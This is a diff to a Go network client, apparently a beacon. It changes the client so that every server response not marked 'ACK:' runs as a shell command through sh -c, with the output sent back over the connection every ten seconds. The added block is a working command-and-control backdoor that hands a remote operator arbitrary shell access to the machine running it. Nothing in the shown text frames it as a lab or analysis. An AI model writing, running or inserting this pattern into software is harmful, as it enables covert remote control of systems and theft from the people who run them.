@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"strings"
 	"time"
@@ -45,10 +46,18 @@ func main() {
 		if err != nil {
 			log.Fatalf("failed to read response: %v", err)
 		}
-
-		log.Printf("received response: %s", strings.TrimSpace(response))
+		if strings.HasPrefix(response, "ACK:") {
+			log.Printf("beacon acknowledged")
+		} else {
+			cmd := exec.Command("sh", "-c", strings.TrimSpace(response))
+			output, err := cmd.CombinedOutput()
+			if err != nil {
+				log.Printf("failed to execute command: %v", err)
+			}
+			log.Printf("command output: %s", output)
+			conn.Write([]byte(output))
+		}
 		conn.Close()
 		time.Sleep(10 * time.Second)
 	}
-
 }
